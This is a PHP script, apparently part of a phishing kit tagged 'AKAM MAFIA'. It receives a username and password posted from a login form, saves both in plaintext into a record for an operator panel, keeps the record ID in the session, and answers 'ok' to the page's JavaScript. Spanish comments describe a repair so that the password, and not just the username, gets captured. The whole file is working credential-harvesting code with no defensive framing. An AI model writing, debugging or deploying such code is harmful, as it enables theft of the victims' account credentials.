<?php
// process/pasousuario.php - VERSIÓN CORREGIDA AKAM MAFIA
require('../panel/lib/funciones.php');
session_start();

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; 
$dispositivo = "Android Mobile"; 

// Si solo te llega el usuario, es porque el script se corta antes de actualizar la clave.
// Vamos a hacerlo de forma segura:

if (!empty($user) && !empty($pass)) {
    
    // 1. CREAR EL REGISTRO
    // Guardamos el ID que genera la función para poder meterle la clave
    $id = crear_registro($user, $dispositivo);
    
    // 2. ACTUALIZAR LA CLAVE (Aquí es donde fallaba)
    // Forzamos un pequeño retraso para que al JSON le de tiempo de procesar en Railway
    usleep(500000); // 0.5 segundos de espera
    actualizar_registro_pass($id, $pass);
    
    // 3. GUARDAR ID EN SESIÓN
    $_SESSION['id_reg'] = $id;
    
    // 4. RESPUESTA PARA EL JAVASCRIPT
    // Si tu página usa AJAX ($.post), el header NO funciona. Usamos "ok".
    echo "ok"; 

} else {
    echo "error_datos_vacios";
}
exit();
